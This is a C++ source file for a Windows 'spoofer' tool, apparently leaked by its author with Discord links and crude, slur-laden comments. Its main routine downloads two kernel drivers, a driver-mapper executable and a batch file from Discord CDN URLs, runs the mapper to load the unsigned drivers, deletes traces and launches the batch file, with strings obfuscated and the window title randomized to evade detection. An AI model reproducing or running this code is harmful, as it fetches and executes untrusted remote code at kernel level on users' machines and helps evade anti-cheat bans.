#include "includes.h"

void Spoofer()
{
	system(_T(EncryptS("cls")));
	HRESULT Spoofer1 = URLDownloadToFile(NULL, _T(EncryptS("https://cdn.discordapp.com/attachments/934023937971609613/936530283249958923/noir.sys")), _T(EncryptS("C:\\Windows\\System\\-noir.sys")), 0, NULL);
	HRESULT Spoofer2 = URLDownloadToFile(NULL, _T(EncryptS("https://cdn.discordapp.com/attachments/934023937971609613/936530283916820531/damapper.exe")), _T(EncryptS("C:\\Windows\\System\\Noir_Tunnel.exe")), 0, NULL);
	HRESULT Spoofer3 = URLDownloadToFile(NULL, _T(EncryptS("https://cdn.discordapp.com/attachments/934023937971609613/936530284139139082/damo2707.sys")), _T(EncryptS("C:\\Windows\\System\\-damo.sys")), 0, NULL);
	system(_T(EncryptS)("cd C:\\Windows\\System"));
	system(_T(EncryptS("start https://discord.gg/waWApHdTAY")));
	system(_T(EncryptS("C:\\Windows\\System\\Noir_Tunnel.exe C:\\Windows\\System\\-noir.sys C:\\Windows\\System\\-damo.sys")));
	system(_T(EncryptS("cls")));
	system(_T(EncryptS("cls")));
	system(_T(EncryptS("cls")));
	system(_T(EncryptS("del C:\\Windows\\System\\Noir_Tunnel.exe")));
	system(_T(EncryptS("del C:\\Windows\\System\\-noir.sys")));
	system(_T(EncryptS("del C:\\Windows\\System\\-damo.sys")));
	system(_T(EncryptS("cls")));
	MessageBox(0, "(Maybe) Spoofed successfully!", "noir.cpp", MB_OK);
	HRESULT Spoofer4 = URLDownloadToFile(NULL, _T(EncryptS("https://cdn.discordapp.com/attachments/934023937971609613/936357073808154755/Serial.bat")), _T(EncryptS("C:\\Windows\\System\\check.bat")), 0, NULL);

}

std::string titlerandomizer()
{
	std::string string = EncryptS("1234567890QWERTYUIOPASDFGHJKLZXCVMBNMqwertyuiopasdfghjklzxcvmbnm!@#$%^&*()_+{}:'><?~`");
	std::string varstring;
	int title;
	while (varstring.size() != 67)
	{
		title = ((rand() % (string.size() + 1)));
		varstring += string.substr(title, 1);
	}
	return varstring + " ";
}

void activate()
{
	while (true)
	{
		SetConsoleTitleA(titlerandomizer().c_str());
	}
}

std::thread title(titlerandomizer);

int main()
{
	system(_T(EncryptS("cls")));
	system(_T(EncryptS("color a")));
	printf(_T(EncryptS("			developed by damo#2707\n")));
	Sleep(2000);
	system(_T(EncryptS("cls")));
	Spoofer();
	system(_T(EncryptS("color c")));
	Beep(100, 250);
	Beep(200, 250);
	Beep(300, 250);
	Beep(400, 250);
	Beep(500, 250);
	Beep(600, 250);
	Beep(700, 250);
	Beep(800, 250);
	Beep(900, 250);
	Beep(1000, 250);
	Beep(900, 250);
	Beep(800, 250);
	Beep(700, 250);
	Beep(600, 250);
	Beep(500, 250);
	Beep(400, 250);
	Beep(300, 250);
	Beep(200, 250);
	Beep(100, 250);
	system(_T(EncryptS("start C:\\Windows\\System\\check.bat")));
	Sleep(6500);
	
}

// I've leaked source on my discord so I post it on github
// https://discord.gg/waWApHdTAY 
// sell = fucked hardly
// not credit me = gay af
// I removed couple of things like ascii skull etc.